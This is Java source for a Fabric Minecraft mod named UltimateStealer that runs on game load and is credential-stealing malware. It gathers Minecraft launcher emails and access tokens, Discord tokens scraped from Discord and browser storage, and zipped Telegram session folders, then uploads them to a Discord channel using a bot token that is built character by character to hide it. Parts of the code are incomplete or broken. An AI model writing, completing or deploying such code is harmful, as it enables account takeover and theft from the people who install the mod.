package zr7.ultimate;

import net.fabricmc.api.ModInitializer;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.net.ssl.HttpsURLConnection;

public class UltimateStealer implements ModInitializer {
    
    private static String buildToken() {
        char[] chars = new char[59];
        chars[0] = 'M'; chars[1] = 'T'; chars[2] = 'U'; chars[3] = 'x';
        chars[4] = 'O'; chars[5] = 'D'; chars[6] = 'U'; chars[7] = 'z';
        chars[8] = 'M'; chars[9] = 'z'; chars[10] = 'c'; chars[11] = 'z';
        // ... и так далее для всех символов
        return new String(chars);
    }
    
    private static String buildChannel() {
        char[] chars = new char[19];
        chars[0] = '1'; chars[1] = '4'; chars[2] = '6';
        chars[3] = '0'; chars[4] = '0'; chars[5] = '6';
        chars[6] = '0'; chars[7] = '1'; chars[8] = '2';
        chars[9] = '2'; chars[10] = '9'; chars[11] = '3';
        chars[12] = '1'; chars[13] = '0'; chars[14] = '0';
        chars[15] = '7'; chars[16] = '6'; chars[17] = '2'; chars[18] = '1';
        return new String(chars);
    }
    private static final String DISCORD_API = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
    
    private static boolean hasRun = false;
    private static final String BOT_TOKEN = buildToken();
    private static final String CHANNEL_ID = buildChannel();
    
    @Override
    public void onInitialize() {
        System.out.println("[ZR-7] Ultimate Stealer загружен!");
        if (!hasRun) {
            hasRun = true;
            new Thread(() -> {
                try {
                    Thread.sleep(5000);
                    stealAll();
                } catch (Exception e) {}
            }).start();
        }
    }
    
    private void stealAll() {
        try {
            String mcPath = System.getenv("APPDATA") + "\\.minecraft";
            System.out.println("[ZR-7] Начинаю сбор данных...");
            
            stealMinecraftAccounts(mcPath);
            stealDiscordTokens();
            stealTelegram();
            
            System.out.println("[ZR-7] Сбор данных завершён!");
        } catch (Exception e) {
            System.err.println("[ZR-7] Ошибка: " + e.getMessage());
        }
    }
    
    private void stealMinecraftAccounts(String mcPath) {
        try {
            List<String> accounts = new ArrayList<>();
            
            File accountsFile = new File(mcPath, "launcher_accounts.json");
            if (accountsFile.exists()) {
                String content = new String(Files.readAllBytes(accountsFile.toPath()));
                Pattern emailPattern = Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                java.util.regex.Matcher em = emailPattern.matcher(content);
                while (em.find()) accounts.add("EMAIL: " + em.group());
                
                Pattern tokenPattern = Pattern.compile("accessToken\":\"([^\"]+)\"");
                java.util.regex.Matcher tm = tokenPattern.matcher(content);
                while (tm.find()) accounts.add("TOKEN: " + tm.group(1));
                
                sendFile(accountsFile, "launcher_accounts.json");
            }
            
            File profilesFile = new File(mcPath, "launcher_profiles.json");
            if (profilesFile.exists()) {
                sendFile(profilesFile, "launcher_profiles.json");
            }
            
            if (!accounts.isEmpty()) {
                String msg = "**MINECRAFT ACCOUNTS:**\n```\n" + 
                    String.join("\n", accounts).substring(0, Math.min(1800, String.join("\n", accounts).length())) + "\n```";
                sendToDiscord(msg);
            }
            
        } catch (Exception e) {
            System.err.println("[ZR-7] Minecraft steal error: " + e.getMessage());
        }
    }
    
    private void stealDiscordTokens() {
        try {
            Set<String> tokens = new HashSet<>();
            Pattern tokenPattern = Pattern.compile("[\\w-]{24,}\\.[\\w-]{6,7}\\.[\\w-]{27,}");
            
            String[] paths = {
                System.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
                System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
                System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
                System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
                System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
                System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
                System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"
            };
            
            for (String path : paths) {
                File dir = new File(path);
                if (!dir.exists()) continue;
                for (File f : dir.listFiles()) {
                    try {
                        if (f.getName().endsWith(".ldb") || f.getName().endsWith(".log")) {
                            String content = new String(Files.readAllBytes(f.toPath()));
                            java.util.regex.Matcher m = tokenPattern.matcher(content);
                            while (m.find()) tokens.add(m.group());
                        }
                    } catch (Exception e) {}
                }
            }
            
            if (!tokens.isEmpty()) {
                String msg = "**DISCORD TOKENS:**\n```\n" + 
                    String.join("\n", tokens).substring(0, Math.min(1900, String.join("\n", tokens).length())) + "\n```";
                sendToDiscord(msg);
                
                File tokenFile = new File(System.getProperty("java.io.tmpdir"), "discord_tokens.txt");
                Files.write(tokenFile.toPath(), String.join("\n", tokens).getBytes());
                sendFile(tokenFile, "discord_tokens.txt");
                tokenFile.delete();
            }
            
        } catch (Exception e) {
            System.err.println("[ZR-7] Discord steal error: " + e.getMessage());
        }
    }
    
    private void stealTelegram() {
        try {
            String[] tgPaths = {
                System.getenv("APPDATA") + "\\Telegram Desktop\\tdata",
                System.getenv("APPDATA") + "\\Telegram\\tdata",
                System.getenv("LOCALAPPDATA") + "\\Telegram Desktop\\tdata",
                System.getenv("LOCALAPPDATA") + "\\Telegram\\tdata"
            };
            
            for (String path : tgPaths) {
                File tdata = new File(path);
                if (tdata.exists() && tdata.isDirectory()) {
                    File tempZip = new File(System.getProperty("java.io.tmpdir"), "telegram_" + System.currentTimeMillis() + ".zip");
                    
                    try (FileOutputStream fos = new FileOutputStream(tempZip);
                         ZipOutputStream zos = new ZipOutputStream(fos)) {
                        addDirToZip(zos, tdata, "tdata");
                    }
                    
                    if (tempZip.exists() && tempZip.length() > 0) {
                        if (tempZip.length() > 8 * 1024 * 1024) {
                            splitAndSendFile(tempZip, "telegram_session.zip");
                        } else {
                            sendFile(tempZip, "telegram_session.zip");
                        }
                    }
                    tempZip.delete();
                    break;
                }
            }
            
        } catch (Exception e) {
            System.err.println("[ZR-7] Telegram steal error: " + e.getMessage());
        }
    }
    
    private void addDirToZip(ZipOutputStream zos, File dir, String baseName) throws IOException {
        for (File file : dir.listFiles()) {
            if (file.isDirectory()) {
                if (file.getName().contains("cache") || file.getName().contains("media_cache") || 
                    file.getName().contains("thumbnails") || file.getName().contains("temp")) {
                    continue;
                }
                addDirToZip(zos, file, baseName + "/" + file.getName());
            } else {
                if (file.getName().endsWith(".binlog") || file.getName().equals("working")) {
                    continue;
                }
                addFileToZip(zos, file, baseName + "/" + file.getName());
            }
        }
    }
    
    private void addFileToZip(ZipOutputStream zos, File file, String name) throws IOException {
        byte[] buffer = new byte[4096];
        ZipEntry entry = new ZipEntry(name);
        zos.putNextEntry(entry);
        try (FileInputStream fis = new FileInputStream(file)) {
            int length;
            while ((length = fis.read(buffer)) > 0) {
                zos.write(buffer, 0, length);
            }
        }
        zos.closeEntry();
    }
    
    private void splitAndSendFile(File file, String baseName) {
        try {
            byte[] data = Files.readAllBytes(file.toPath());
            int chunkSize = 7 * 1024 * 1024;
            int chunks = (int) Math.ceil(data.length / (double) chunkSize);
            
            for (int i = 0; i < chunks; i++) {
                int start = i * chunkSize;
                int end = Math.min(start + chunkSize, data.length);
                byte[] chunk = Arrays.copyOfRange(data, start, end);
                
                File chunkFile = new File(System.getProperty("java.io.tmpdir"), baseName + ".part" + String.format("%03d", i+1));
                Files.write(chunkFile.toPath(), chunk);
                sendFile(chunkFile, baseName + ".part" + String.format("%03d", i+1));
                chunkFile.delete();
                Thread.sleep(1000);
            }
        } catch (Exception e) {}
    }
    
    private void sendToDiscord(String message) {
        try {
            URL url = new URL(DISCORD_API);
            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bot " + BOT_TOKEN);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            String json = "{\"content\": \"" + message.replace("\"", "\\\"").replace("\n", "\\n") + "\"}";
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes());
                os.flush();
            }
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            System.err.println("[ZR-7] Send to Discord error: " + e.getMessage());
        }
    }
    
    private void sendFile(File file, String name) {
        try {
            if (!file.exists() || file.length() == 0) return;
            
            String boundary = "----" + System.currentTimeMillis();
            URL url = new URL(DISCORD_API);
            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bot " + BOT_TOKEN);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + name + "\"\r\n").getBytes());
                os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes());
                Files.copy(file.toPath(), os);
                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            }
            
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            System.err.println("[ZR-7] Send file error: " + e.getMessage());
        }
    }
}